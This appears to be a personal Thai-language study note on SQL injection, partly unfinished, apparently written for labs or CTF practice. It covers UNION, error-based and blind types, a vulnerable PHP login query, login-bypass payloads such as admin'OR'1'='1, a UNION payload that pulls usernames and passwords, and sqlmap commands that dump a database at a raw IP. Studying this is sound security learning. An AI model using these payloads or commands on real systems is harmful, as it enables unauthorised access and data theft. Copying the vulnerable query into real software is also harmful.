### <span style="color:rgb(255, 162, 31)">What is SQL Injection</span>
SQL Injection คือ ช่องโหว่ของ website ที่ผู้โจมตีจะทำการแก้ไข request เพื่อเข้าถึง database ที่ไม่ควรเข้าถึง

### <span style="color:rgb(255, 162, 31)">What is Impact of a successful SQL Injection attack?</span> 
ผลของการโจมตีคือ การเข้าถึงข้อมูลที่ละเอียดอ่อน เช่น
- รหัสผ่าน
- ข้อมูลส่วนตัว

### <span style="color:rgb(255, 162, 31)">How to detect SQL injection vulnerabilities</span> 
-

### <span style="color:rgb(255, 162, 31)">SQL Injection Type (Depending on the situation)</span>

- In-Band SQLi (Classic) : คือการดึงข้อมูลมาโชว์หน้าเว็บให้เห็น
	- Error-Based - SQL Injection
	- Union - SQL Injection
- Inferential SQLi (Blind) : Server จะปิดการแสดงผลข้อมูลทั้งหมด ทั้ง Database และ Error Message ทำให้มองไม่เห็นข้อมูลโดยตรง เราจะต้อง "คาดเดาพฤติกรรม server เอาเองโดยใช้การสังเกตุ"
	- Blind - SQL Injection

- Examining the database
- (ส่วนเสริม) Retrieving hidden data || Concept SQL injection path
- SQL Truncate Attack 
- Bypass Login - SQL Injection || Subverting application login


#### <span style="color:rgb(232, 101, 0)">Examining the database</span>
หากเราทราบว่ามันมีช่องโหว่ SQL Injection เราก็สามารถหาข้อมูลเกี่ยวกับฐานข้อมูลได้ ซึ่งได้แก่
- ประเภท ของฐานข้อมูล ว่าเป็นของค่ายไหน ได้แก่ 
	  - Microsoft 
	  - MySQL
	  - Oracle 
	  - PostgreSQL 
- version ของฐานข้อมูล
- ข้อมูลต่างๆ ของฐานข้อมูลนี้

วิธีเช็ค Verion ของแต่ละ ฐานข้อมูล
	  - Microsoft , MySQL : `SELECT @@version`
	  - Oracle : `SELECT * FROM v$version`
	  - PostgreSQL : `SELECT version()`
 ตัวอย่าง เราจะใช้ UNION ในการเช็ค
```
' UNION SELECT @@version--
```
ผลลัพท์จะประมาณนี้ 
```
Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64) Mar 18 2018 09:11:49 Copyright (c) Microsoft Corporation Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
```
#### <span style="color:rgb(232, 101, 0)">Retrieving hidden data</span>
หัวข้อนี้ก็ไม่มีไรมาก มันคือการ command หรือ ทำให้มันเป็น True เสมอในภาษา SQL
โดยมันเป็นไวยากรณ์ของภาษานี้

**Example Student Case**
สมมุติเราอยู่หน้าร้านค้า Page หน้าหนึ่ง
![[Pasted image 20260726204329.png|379]]
เวลาเราเลือกดูหมวดหมู่แบบเช่น Gifts 
Web app จะทำการส่ง request ไปยัง Server แบบนี้
```
https://insecure-website.com/products?category=Gifts
```
ซึ่งมันจะแปลงเป็น SQL query เพื่อไปขอข้อมูลกับ Database เป็นแบบนี้
```SQL
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```
ความหมายคือ
	SELECT * คือ เลือกทั้งหมด
	FROM product คือ จาก product database
	WHERE category = 'Gifts' AND released = 1 คือ เอาตรงที่ชื่อ category ชื่อ 'Gifts' และ มีค่า released เท่ากับ 1
released คือ สิ่งที่จะบอกว่าสินค้านี้จำหน่ายอยู่รึป่าว ถ้าจำหน่ายก็จะเป็น released = 1 แต่ถ้าไม่ก็เป็น released = 0

ซึ่งถ้า Web application ไม่มีการป้องกันการโจมตี SQL Injection ผู้โจมตีสามารถทำแบบนี้ได้
```
https://insecure-website.com/products?category=Gifts'--
```
ซึ่งผลลัพท์ใน SQL query จะเป็น
```SQL
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```
การใส่ `--` คือเป็นการทำ comment ใน SQL ทำให้ข้อความด้านหลังมันหายไปเลย
หรือ
```
https://insecure-website.com/products?category=Gifts'+OR+1=1--
```
Result in SQL query 
```SQL
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```
`OR 1=1--` มันคือการทำให้เป็น True เสมอและ `--` คือการ comment
ผลลัพท์ของการทำนี้คือ มันจะแสดงทุกอย่าง โดยต้องเช็คว่าสินค้ามีสถานะ release เป็นยังไง
เป็นต้น

ข้อควรระวังในการใช้ OR 1=1 

> [!NOTE] ข้อควรระวังในการใช้ OR 1=1 
> คือการใช้ OR 1=1 มันทำให้ มัน True ทุกอย่าง รวมไปถึงพวกคำสั่ง DELECT ผลลัพท์คือ Data อาจจะถูกลบได้

#### <span style="color:rgb(232, 101, 0)">SQL Truncate Attack</span>
SQL truncate attack คือ ช่องโหว่ที่เกิดจากการ ตัดทอน(truncate) ของข้อมูลที่ยาวเกินความยาวของ column 
ตัวอย่างการโจมตี
1. สมมุติ admin username = admin
2. hacker จะโจมตีโดยสมัครบัญชีชื่อ admin                     a (จะมีการเว้นช่องว่างไว้)
3. ฐานข้อมูลก็จะมีการตัดทอนที่เกินไป จนได้เป็น ชื่อ admin 

#### <span style="color:rgb(232, 101, 0)">Bypass Login - SQL Injection</span>
โค้ด SQL ตรงส่วนของ Login มีช่องโหว่ เลยสามารถใช้วิธีการ bypass ได้ (พบได้น้อยในปัจจุบัน เพราะมันป้องกันง่าย)
ตัวอย่างโค้ดที่มีช่องโหว่
```plaintext
$myusername = $_POST['email'];
$mypassword = $_POST['password'];
$sql = "SELECT * FROM member WHERE Username = '$myusername' and password = '$mypassword'";
$result = mysqli_query($conn,$sql) or die("Error: " . mysqli_error($conn));
$count = mysqli_num_rows($result);
// If result matched $myusername and $mypassword, table row must be 1 row
if($count == 1) {
    //session_register("myusername");
    $_SESSION['username'] = $myusername;
    echo $_SESSION['username'];
    header("Location: panel.php");
} else {
    $error = "Your Login Username or Password is invalid";
    header("Location: index.php");
}
```
[[SQL Injection Bypass Login]]

payloadในการโจมตี
```
admin'OR'1'='1
admin'OR'1'='1' LIMIT 1;-- #
```

#### <span style="color:rgb(232, 101, 0)">Union - SQL Injection</span> 
##### <span style="color:rgb(179, 54, 0)">ขั้นตอนการโจมตีด้วย Union - SQL Injection</span>
1. หาว่ามีการ return ออกมากี่ column 
   `' UNION SELECT NULL--` , `+UNION+SELECT+NULL-- `
   `' ORDER BY 1--` ,    `'+ORDER+BY+1--`
2. หาต่อว่า column แต่ละอันมีชนิดข้อมูลเป็นอะไร
   `' UNION SELECT 'a',NULL,NULL,NULL--`
3. เข้าข้อมูลที่ได้ไปใช้ในการดึงข้อมูลที่น่าสนใจ
   ตัวอย่าง
   `' UNION SELECT username, password FROM users--`
##### <span style="color:rgb(179, 54, 0)">Keyword</span>
เมื่อไหร่ที่ Web application มีช่องโหว่ SQL injection มันมักจะ return ค่าต่างๆออกมาจาก database ซึ่งเราสามารถใช้ Union ซึ่งเป็นไวยกรณ์ในภาษา SQL ใช้การโจมตี เพื่อให้มันดึงข้อมูลส่วนอื่นออกมาได้ 

คำสั่ง Union มันทำให้เราใช้ Select ได้เพิ่มและคำสั่งนั้นเข้าไปใน select เดิม
ตัวอย่าง
```
SELECT a,b FROM table1 UNION SELECT c,d FROM table2
```
คำสั่ง SQL นี้จะส่งคืนชุดผลลัพท์เดียวที่มี 2 Column โดย Column a , b จะมาจากตาราง table1 และ Column c, d จะมาจากตาราง table2

แต่การใช้คำสั่ง UNION มันมีเงื่อนไขในการใช้งานอยู่คือ
- คำสั่งค้นหาแต่ละคำสั่ง ต้องคืนค่า Column เท่ากันหมด 
   ยกตัวอย่าง
   SELECT a, b = SELECT c, d
- ชนิดข้อมูลแต่ละ Column ต้องเข้ากันได้
   ยกตัวอย่าง
   ถ้า Column a มีค่าเป็น string , Column c ที่ตรงตำแหน่งเดียวกับ a ก็ต้องมีค่าเป็น string
การโจมตีด้วย Union SQL injection นั้นจะสำเร็จก็ต่อเมื่อการโจมตีตรงกับ 2 เงื่อนไขที่ว่าไป โดยเราจะเริ่มหาข้อมูลเพื่อใช้ในการโจมตีด้วย
1. การหาว่ามี Column กี่อันที่ถูกส่งออกมาจากคำสั่ง query เดิม
   ในการทำโจมตี Union SQL injection คุณจะรู้ว่าตัวระบบส่ง Column คืนมากี่อัน เพราะการใช้ Union ในการโจมตี มันบังคับว่า **จำนวน Column ที่แทรกจะต้องตรงกันกับจำนวน Column ดั้งเดิม**
2. ตรวจชนิดข้อมูล(Data Type) ของ Column จาก query ดั้งเดิม ว่า Column ไหนบ้างที่ตรงและเหมาะสมในการใช้ดึงผลลัพท์ด้วย query แทรก
##### <span style="color:rgb(179, 54, 0)">วิธีตรวจสอบ</span>


เมื่อคุณจะทำการโจมตีด้วย Union SQL injection มันมีด้วยกัน 2 วิธีที่จะเช็คว่า Column กี่อันที่ส่งกับมาจาก query ดั้งเดิม
###### **วิธีที่ 1**
การฉีด  ORDER BY เข้า แล้วค่อยเพิ่มเลขอ้างอิงเรื่อยๆ จนเกิด error จะทำให้เรารู้จำนวน column
โดยถ้าจุดที่ฉีดเป็นอยู่ในเงือนไข WHERE ของ query ให้เราทำแบบนี้

**อธิบาย**
คำสั่ง ORDER BY 1 ใน ภาษา SQL หมายถึง ให้เรียงผลลัพท์ตาม column ที่ 1

**ตัวอย่าง**
`' ORDER BY 1--` $\rightarrow$ สั่งเรียงตามคอลัมน์ที่ 1 (ถ้ามีคอลัมน์เดียวขึ้นไป หน้าเว็บจะยังทำงานปกติ)
`' ORDER BY 2--` $\rightarrow$ สั่งเรียงตามคอลัมน์ที่ 2 (ถ้ามี 2 คอลัมน์ขึ้นไป หน้าเว็บยังปกติ)
`' ORDER BY 3--` $\rightarrow$ สั่งเรียงตามคอลัมน์ที่ 3 (ถ้ามี 3 คอลัมน์ขึ้นไป หน้าเว็บยังปกติ)
`' ORDER BY 4--` $\rightarrow$ สมมติว่าระบบเดิมมีแค่ **3 คอลัมน์** พอเราสั่งเรียงตามคอลัมน์ที่ 4 ฐานข้อมูลจะหาคอลัมน์ที่ 4 ไม่เจอ แล้วจะ **ส่งข้อผิดพลาด (Error)** กลับมาทันที!
**สรุปจุดประสงค์:** ถ้าเรายิงไปถึง `ORDER BY 4--` แล้วเจอฟ้อง Error หรือหน้าเว็บพัง แปลว่า **คิวรีดั้งเดิมมีทั้งหมด 3 คอลัมน์** ครับ (เลขสุดท้ายที่ผ่านก่อนจะ Error คือจำนวนคอลัมน์จริง)

**CaseStudy**
เพื่อให้เห็นภาพชัดเจน มาดูเปรียบเทียบระหว่าง **คำสั่งเดิมของระบบ** กับ **สิ่งเกิดขึ้นเมื่อเราฉีด Payload เข้าไป** ครับ

**1. คำสั่ง SQL ดั้งเดิมของเว็บไซต์ (ก่อนถูกฉีด)**
สมมติว่าเว็บไซต์มีระบบค้นหาสินค้าตามหมวดหมู่ (Category) โดยเบื้องหลังโค้ดเขียนไว้แบบนี้:
```SQL
SELECT title, description, price FROM products WHERE category = 'Gifts' 
```
- **สิ่งที่ระบบทำ:** ดึงข้อมูล 3 คอลัมน์ ได้แก่ `title` (คอลัมน์ที่ 1), `description` (คอลัมน์ที่ 2) และ `price` (คอลัมน์ที่ 3)

 **2. เมื่อเราเริ่มทดสอบฉีด `' ORDER BY 1--`**
เราพิมพ์คำว่า `Gifts' ORDER BY 1--` ใส่ในช่องค้นหาบนหน้าเว็บ คำสั่งในฐานข้อมูลจะกลายเป็น:
```SQL
SELECT title, description, price FROM products WHERE category = 'Gifts' ORDER BY 1-- '
```
- **อธิบาย:**
    - อัญประกาศเดี่ยว `'` ตัวแรกที่เราใส่ จะไปปิดข้อความ `'Gifts'` ของเดิม  
    - คำสั่ง `ORDER BY 1` สั่งให้เรียงข้อมูลตามคอลัมน์ที่ 1 (`title`)    
    - เครื่องหมาย `--` จะทำให้เครื่องหมาย `'` ตัวท้ายของระบบกลายเป็นแค่คอมเมนต์ (ถูกมองข้าม)    
- **ผลลัพธ์:** ทำงานผ่านปกติ เพราะระบบมีคอลัมน์ที่ 1 อยู่จริง

**3. ทดสอบเพิ่มตัวเลขไปเรื่อยๆ จนถึง `' ORDER BY 4--`**
เมื่อเราพิมพ์ `Gifts' ORDER BY 4--` คำสั่งในฐานข้อมูลจะกลายเป็น:
```SQL
SELECT title, description, price FROM products WHERE category = 'Gifts' ORDER BY 4-- '
```
- **อธิบาย:** คำสั่งสั่งให้เรียงข้อมูลตาม **คอลัมน์ที่ 4**
- **ผลลัพธ์:** **เกิด Error!** (หรือหน้าเว็บแสดงผลผิดปกติ/พัง) เพราะตารางนี้ดึงมาแค่ 3 คอลัมน์ (`title`, `description`, `price`) ไม่เจอตารางคอลัมน์ที่ 4
- **ข้อสรุปที่แฮกเกอร์ได้:** คิวรีนี้มี **3 คอลัมน์** พอดีเป๊ะ

**4. เมื่อรู้ว่ามี 3 คอลัมน์ ขั้นถัดไปคือใช้ `UNION SELECT`** (และมันเป็นของวิธีที่สองด้วย)
พอเรารู้ว่ามี 3 คอลัมน์ เราจะสามารถฉีดคำสั่ง `UNION SELECT` ด้วยจำนวนคอลัมน์ที่เท่ากัน (3 คอลัมน์) ได้โดยไม่เกิด Error โครงสร้าง:
```SQL
SELECT title, description, price FROM products WHERE category = 'Gifts' UNION SELECT 'a', 'b', 'c'-- '
```
- **ผลลัพธ์:** ข้อมูลชุดใหม่ `'a'`, `'b'`, `'c'` จะถูกนำมารวมและแสดงผลบนหน้าเว็บ ทำให้เราเห็นทันทีว่าคอลัมน์ไหนนำเอาข้อความไปโชว์ตรงส่วนไหนของหน้าจอครับ
###### **วิธีที่ 2**
คือการส่ง Payload แบบ UNION SELECT โดยระบุ NULL เพิ่มขึ้นเรื่อยๆ
- `' UNION SELECT NULL--`
- `' UNION SELECT NULL,NULL--`
- `' UNION SELECT NULL,NULL,NULL--`
- _และเพิ่มขึ้นไปเรื่อยๆ..._
ถ้าจำนวน `NULL` ไม่ตรงกับจำนวนคอลัมน์จริง ฐานข้อมูลจะส่ง Error กลับมา เช่น: _"All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists."_ (คำสั่งที่นำมารวมด้วย UNION ต้องมีจำนวนนิพจน์/คอลัมน์เท่ากัน)

**เหตุผลที่เราใช้ค่า `NULL`** ในคำสั่ง `SELECT` ที่ฉีดเข้าไป เพราะชนิดข้อมูลในแต่ละคอลัมน์ของคำสั่งเดิมกับคำสั่งใหม่ต้องสอดคล้องกัน ซึ่ง **`NULL` สามารถแปลงเข้าได้กับทุกชนิดข้อมูลทั่วไป** จึงช่วยเพิ่มโอกาสให้ Payload ทำงานสำเร็จทันทีเมื่อจำนวนคอลัมน์ถูกต้อง

เช่นเดียวกับ ORDER BY 
ผลลัพท์ใน HTTP response อาจคืนค่ามาเป็นข้อความ Error จากฐานข้อมูล หรือ ไม่แสดงอะไรเลย
แต่เมื่อ NULL พอดีกับจำนวน Column ฐานข้อมูลจะคืนแถวข้อมูลเพิ่มมีอีก 1 แถว ซึ่งค่าจะเป็น NULL ทุก Column
ผลกระทบต่อ HTTP response จะขึ้นอยู่กับโค้ดของแอปพลิเคชัน:
- **ถ้าโชคดี:** คุณจะเห็นเนื้อหาเพิ่มขึ้นมาใน Response เช่น มีแถวว่างๆ เพิ่มขึ้นมาในตาราง HTML
- **ถ้าโชคไม่ดี:** ค่า Null อาจไปทำให้เกิด Error แบบอื่นแทน (เช่น `NullPointerException` ในโค้ดภาษาหลังบ้าน)
- **กรณีที่แย่ที่สุด:** หน้าตา Response ตอนใส่จำนวน `NULL` ถูกต้อง ออกมาเหมือนกับตอนใส่ผิด ซึ่งจะทำให้เทคนิควิธีนี้ใช้ไม่ได้ผล

**สรุปประเด็นสำคัญที่ต้องจำนำไปใช้**
1. **ทำไมต้องใช้ `NULL`?**
    - ชนิดข้อมูล (`Data Type`) ของแต่ละคอลัมน์ใน `UNION` ต้องตรงกัน การใส่ข้อความหรือตัวเลขตรงๆ อาจทำให้เกิด Error เรื่อง Data Type Mismatch ได้
        
    - แต่ **`NULL` เข้าได้กับทุก Data Type** (ไม่ว่าคอลัมน์นั้นจะเป็น ตัวเลข, ข้อความ, วันที่) ทำให้เราโฟกัสแค่เรื่อง **"นับจำนวนคอลัมน์"** ได้โดยไม่ต้องกังวลเรื่องชนิดข้อมูลในขั้นตอนนี้
2. **จุดสังเกตว่าใส่ `NULL` ครบจำนวนหรือยัง:**
    - **ตอนใส่ไม่ครบ:** เว็บไซต์จะพัง, เกิด Error หรือขึ้น Internal Server Error 500
    - **ตอนใส่ครบพอดี:** หน้าเว็บกลับมาโหลดได้ปกติ (Status 200 OK) หรือตารางผลลัพธ์บนหน้าเว็บมีแถวว่างๆ เพิ่มขึ้นมา 1 แถว

##### <span style="color:rgb(179, 54, 0)">Database-specific syntax (Oracle)</span>




โจทย์ที่เคยทำที่เกี่ยวกับ Union SQL injection
- [[Union - SQL Injection]]

รวม payload ที่ใช้
```

```

#### <span style="color:rgb(232, 101, 0)">Blind SQLi</span>
blind = ตาบอด = ซ่อนไม่ให้เห็นไรงี้ 

**Blind SQLi คืออะไร ?**
Blind - SQLi คือการที่จะไม่มีการแสดง Error ออกมาใน HTTP response ให้เราเห็นนั่นเอง

**ความแตกต่างระหว่าง Blind SQLi กับ Union SQLi**
Blind SQLi นั้นแตกต่างการ Union SQLi ตรงที่ Union มันจะแสดงผลลัพท์ของการ inject ให้เห็นใน HTTP response เลย ไม่เหมือนกับ Blind SQLi ที่มันจะไม่แสดงอะไรให้เราเห็นเลย
คือเรายังสามารถแบบ SQLi ได้เหมือนเดิม ที่ต้องใช้วิธีที่แตกต่างจากเดิม



#### <span style="color:rgb(232, 101, 0)">Error-Based - SQL Injection</span>
คล้ายกับ Union - SQL Injection แต่เปลี่ยนมาใช้ error base sql injection แทน ซึ่งนะเน้นดู error message ที่ตอบกลับมาจาก website 

<span style="color:rgb(255, 141, 10)">เรียนไม่จบที่ เดี่ยวมาต่อ</span>

### <span style="color:rgb(255, 162, 31)">Tool SQL Injection </span>
SQLmap
![[Pasted image 20250818145751.png]]
เป็นอุปกรณ์ที่ใช้ในการทำ SQL Injection ได้หลากหลายมาก
![[Pasted image 20250818182222.png]]
วิธีใช้พวก command  ลองไปศึกษากันดูได้
แต่ผมจะยก command ที่เราจะใช้ใน SQLinjection ในครั้งนี้มาให้ดูกัน
```
sqlmap -u "http://34.124.137.38/?bookID=1" -p bookID --dbs
sqlmap -u "http://34.124.137.38/?bookID=1" -p bookID -D book --tables
sqlmap -u "http://34.124.137.38/?bookID=1" -p bookID -D book -T flag -dump
sqlmap -u "http://34.124.137.38/?bookID=1" -p bookID -D book -T flag --column
sqlmap -u "http://34.124.137.38/?bookID=1" -p bookID -D book -T flag -C flag_value --dump
```
[[CaseStudy to use Tool SQL Injection]]

อีกวิธีที่แนะนำ
ใช้ burpsuite ในการดู request และ save มันไปใช้ในการโจมตี
![[Pasted image 20250818185232.png]]
สมมุติ save ชื่อ check.txt
จากนั้นก็ใช้เครื่องมือ เหมือนเดิมเลยย 
```
sqlmap -r check.txt -p bookID --dbs
 sqlmap -r check.txt -p bookID -D book -tables
sqlmap -r check.txt -p bookID -D book -T <something> --dump
```